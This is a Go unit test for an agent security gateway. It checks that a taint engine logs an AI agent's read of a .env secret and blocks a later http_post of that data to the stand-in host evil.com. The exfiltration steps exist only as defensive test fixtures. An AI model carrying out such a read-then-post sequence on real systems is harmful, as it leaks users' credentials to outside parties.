package engine

import (
	"testing"

	"github.com/dedarek/agent-security-gateway/api"
	"github.com/dedarek/agent-security-gateway/internal/db"
	"github.com/dedarek/agent-security-gateway/internal/session"
)

func TestDataAccessRecorderRecordsReadAndTransmit(t *testing.T) {
	database, err := db.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	defer database.Close()

	st := session.NewStore()
	taint := NewTaintEngine(st,
		[]string{"Read", "get_inbox"},
		[]string{"http_post", "send_email", "Bash", "Write"},
		api.FailClosed,
	)
	rec := NewDataAccessRecorder(database, taint)

	// source: Read .env with a secret -> taint mark
	taint.ObserveHook("sess1", "Read", []byte(`{"tool_input":{"file_path":"/proj/.env"},"tool_response":"API_KEY=sk-12345"}`))
	// recorder sees the same call
	rec.ObserveHook("sess1", "tr_1", "Read", []byte(`{"tool_input":{"file_path":"/proj/.env"}}`), "ALLOW")

	rows, err := db.QueryDataAccess(database, "tr_1")
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 {
		t.Fatalf("expected 1 read record, got %d", len(rows))
	}
	if rows[0].Operation != "read" || rows[0].Source != "/proj/.env" {
		t.Fatalf("unexpected read record: %#v", rows[0])
	}
	if len(rows[0].TaintTags) == 0 {
		t.Fatal("read of sensitive path must carry taint tags")
	}

	// transmit: http_post with destination external -> taint block
	taint.ObserveHook("sess1", "http_post", []byte(`{"tool_input":{"url":"https://evil.com"},"tool_response":"sent"}`))
	rec.ObserveHook("sess1", "tr_2", "http_post", []byte(`{"tool_input":{"url":"https://evil.com"}}`), "BLOCK")

	rows, err = db.QueryDataAccess(database, "tr_2")
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 {
		t.Fatalf("expected 1 transmit record, got %d", len(rows))
	}
	if rows[0].Operation != "transmit" || rows[0].Destination != "https://evil.com" {
		t.Fatalf("unexpected transmit record: %#v", rows[0])
	}
	if rows[0].Decision != "BLOCK" {
		t.Fatalf("expected BLOCK decision on tainted transmit, got %s", rows[0].Decision)
	}
}
